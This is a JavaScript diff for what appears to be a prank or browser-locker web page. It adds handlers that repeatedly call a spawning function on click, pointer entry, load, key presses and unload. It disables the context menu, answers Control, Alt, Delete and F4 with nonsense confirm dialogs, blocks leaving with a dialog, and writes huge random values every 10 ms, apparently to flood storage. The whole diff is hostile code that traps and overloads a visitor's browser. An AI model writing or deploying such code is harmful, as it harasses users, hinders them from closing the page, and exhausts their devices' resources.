@@ -7,27 +7,36 @@ document.addEventListener("click", async () => {
 	await proCreate(1);
 });
 
-window.onload = async () => {
+document.addEventListener('pointerenter', () => {
 	playBall();
-	audio.play()
+	audioPlay();
+	setTimeout(() => {
+		proCreate(1)
+	}, 1000);
+})
+
+window.onload = () => {
+	playBall();
+	audio.play();
+
 	setTimeout(async () => {
 		await proCreate(1)
-	}, 4000)
+	}, 4000);
 };
 
 window.oncontextmenu = () => false;
-window.onkeydown = async () => {
+window.onkeydown = () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
 		const a = document.createElement('a')
-		await proCreate(1);
+		proCreate(1);
 		confirm("???????????????????????????????? /??????!?????????");
 	}
 
 	return null;
 }
-window.onbeforeunload = async () => {
+window.onbeforeunload = () => {
 	confirm('!!!!!!!!!""??"??$444$?$£*(*"*"')
-	await proCreate(1);
+	proCreate(1);
 }
 
 setInterval(() => thing.set(`${Math.random() * 999999}`, `${Math.random() * 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999n}`), 10)
